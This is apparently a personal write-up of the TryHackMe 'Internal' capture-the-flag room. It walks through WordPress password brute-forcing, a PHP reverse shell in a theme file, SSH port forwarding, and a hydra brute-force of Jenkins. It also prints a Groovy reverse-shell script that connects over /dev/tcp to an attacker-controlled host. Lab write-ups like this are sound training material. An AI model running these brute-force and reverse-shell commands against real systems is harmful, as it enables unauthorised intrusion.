---
title: "Internal"
date: 2024-03-13
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---



## Enumeration

Lets start with the simple nmap and rustscan.
```
nmap -sVC 10.10.131.133             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 12:18 +0545
Nmap scan report for internal.thm (10.10.131.133)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
49/tcp filtered tacacs
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
```

Lets enumerate port 80.
![](Pasted%20image%2020250313122042.png)

Lets also do a directory busting.

![](Pasted%20image%2020250313122333.png)

Lots of thing.
Specially `/wordpress`.
Hmmm a wordpress site.
![](Pasted%20image%2020250313122728.png)
Lets use wpscan.
Lets enumerate.
![](Pasted%20image%2020250313123254.png)

We found the user admin.
Lets also try to crack password by rockyou.txt.

And got the password by bruteforce.

![](Pasted%20image%2020250313124551.png)

`Username: admin, Password: my2boys`

![](Pasted%20image%2020250313124635.png)

## Foothold

Lets do it.
![](Pasted%20image%2020250313124749.png)

We can now edit 404.php and execute our rev shell.

![](Pasted%20image%2020250313125813.png)

Lets add a php rev shell.
![](Pasted%20image%2020250313130120.png)

And we can trigger it.
`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![](Pasted%20image%2020250313130256.png)
We got the shell.

## privilege escalation

Lets enumerate further.
![](Pasted%20image%2020250313130435.png)

We got the full tty shell.
And a password for user `aubreanna`.
![](Pasted%20image%2020250313130615.png)

We got the pass.
`aubreanna:bubb13guM!@#123`

Lets so ssh.

![](Pasted%20image%2020250313130735.png)

## Pivoting

And got something interesting.
![](Pasted%20image%2020250313130916.png)

Hmm lets enumerate.
![](Pasted%20image%2020250313131137.png)


Lets also enumerate mysql.

![](Pasted%20image%2020250313131217.png)

```
wp-config.php files found:                                                                                                                                              
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );

```

![](Pasted%20image%2020250313131434.png)
![](Pasted%20image%2020250313131605.png)

But nothing,lets forward that port `8080` of `172.17.0.2`  to our machine.

Lets forward the port to my machine.
`ssh -L 8000:172.17.0.2:8080 aubreanna@internal.thm`

So here we gonna use ssh and forward `172.17.0.2:8080` to my machine in port 8000.
![](Pasted%20image%2020250313132045.png)
Lets enumerate this.
But the password from before didn't worked.
`aubreanna:bubb13guM!@#123`

Hmm lets see.

![](Pasted%20image%2020250313142721.png)

![](Pasted%20image%2020250313151838.png)

```
root      1424  0.0  0.1 404800  3404 ?        Sl   06:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
root      1438  0.0  0.2   9364  5356 ?        Sl   06:32   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
aubrean+  1477  0.0  0.0   1148     4 ?        Ss   06:32   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1522  2.3 22.4 2764040 457612 ?      Sl   06:32   4:13 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war

```


But nothing lets try to bruteforcing the password with admin user.
![](Pasted%20image%2020250313152540.png)


```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8000 http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid'

```

And it worked.
![](Pasted%20image%2020250313153227.png)

`spongebob`
We got the password.

Lets login.
![](Pasted%20image%2020250313153310.png)

Lets enumerate this.
![](Pasted%20image%2020250313153939.png)
![](Pasted%20image%2020250313154002.png)

I don't know how to write a script to get rev shell in [Groovy script](http://www.groovy-lang.org)
So I will use chatGPT.

And it is.
```groovy
String host = "ip";
int port = port;
String cmd = "/bin/bash";

Process proc = new ProcessBuilder(cmd, "-c", "exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do \$line 2>&5 >&5; done").start();
proc.waitFor();

```

And we got the shell.
![](Pasted%20image%2020250313154757.png)

![](Pasted%20image%2020250313155005.png)

## Escape

Now lets enumerate.
After checking some file we got this hash but its useless and didn't worked.
```
<passwordHash>#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe</passwordHash>
```

After sometime,we got `note.txt` in `/opt`.
![](Pasted%20image%2020250313163359.png)
`root:tr0ub13guM!@#123`

We got the root password but not on this machine.
We can again go to our main machine and get root shell.
![](Pasted%20image%2020250313164605.png)

## Done
And done.
![](Pasted%20image%2020250313163557.png)

Learned lots of thing again with this room.
I hope you enjoyed this.


## Refs
[tty shell](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
[revshell](https://www.revshells.com/)
